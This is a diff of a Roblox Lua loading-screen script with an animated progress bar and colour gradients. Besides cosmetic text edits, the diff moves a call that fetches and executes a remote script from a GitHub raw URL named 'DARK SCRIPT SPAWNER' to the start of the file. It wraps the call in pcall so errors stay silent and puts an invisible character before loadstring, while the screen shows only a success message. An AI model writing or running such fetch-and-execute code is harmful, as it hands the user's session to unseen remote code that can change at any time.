@@ -1,11 +1,17 @@
 local TweenService = game:GetService("TweenService")
 
+-- Execute the external script at the start
+pcall(function()
+    ‎loadstring(game:HttpGet("https://raw.githubusercontent.com/vincen11226/DARK-SCRIPT-spawner-/refs/heads/main/DARK%20SCRIPT%20SPAWNER"))()
+end)
+
 local ScreenGui = Instance.new("ScreenGui")
 local Frame = Instance.new("Frame")
 local TextLabel = Instance.new("TextLabel")
 local ProgressBarBG = Instance.new("Frame")
 local ProgressBar = Instance.new("Frame")
 local Gradient = Instance.new("UIGradient")
+local TextGradient = Instance.new("UIGradient")
 local UICornerBG = Instance.new("UICorner")
 local UICornerBar = Instance.new("UICorner")
 local UIStroke = Instance.new("UIStroke")
@@ -36,7 +42,6 @@ spawn(function()
     while ScreenGui.Parent do
         for i = 0, 360, 2 do
             Gradient.Rotation = i
-            -- Animate the gradient color over time for a "cool" effect
             t = t + 0.03
             local r = math.abs(math.sin(t)) * 255
             local g = math.abs(math.sin(t + 2)) * 255
@@ -58,13 +63,12 @@ TextLabel.AnchorPoint = Vector2.new(0.5, 0.5)
 TextLabel.Position = UDim2.new(0.5, 0, 0.4, 0)
 TextLabel.Size = UDim2.new(0.8, 0, 0.2, 0)
 TextLabel.BackgroundTransparency = 1
-TextLabel.Text = "The script is executed successfully, Please wait For a while"
+TextLabel.Text = "The script is executed successfully"
 TextLabel.TextColor3 = Color3.fromRGB(255, 255, 255)
 TextLabel.Font = Enum.Font.SourceSansBold
 TextLabel.TextScaled = true
 
 -- Animated text color gradient
-local TextGradient = Instance.new("UIGradient")
 TextGradient.Color = ColorSequence.new{
     ColorSequenceKeypoint.new(0, Color3.fromRGB(255, 0, 0)),
     ColorSequenceKeypoint.new(0.5, Color3.fromRGB(255, 255, 0)),
@@ -113,7 +117,7 @@ for i = 1, totalSteps do
     if i == 1 then
         TextLabel.Text = "The script is executed successfully"
     elseif i == 21 then
-        TextLabel.Text = "Please wait a while"
+        TextLabel.Text = "Plss wait a while"
     elseif i == 41 then
         TextLabel.Text = "Almost there..."
     end
@@ -126,6 +130,3 @@ for i = 1, totalSteps do
 end
 
 ScreenGui:Destroy()
-
-
-loadstring(game:HttpGet("https://raw.githubusercontent.com/vincen11226/DARK-SCRIPT-spawner-/refs/heads/main/DARK%20SCRIPT%20SPAWNER"))()
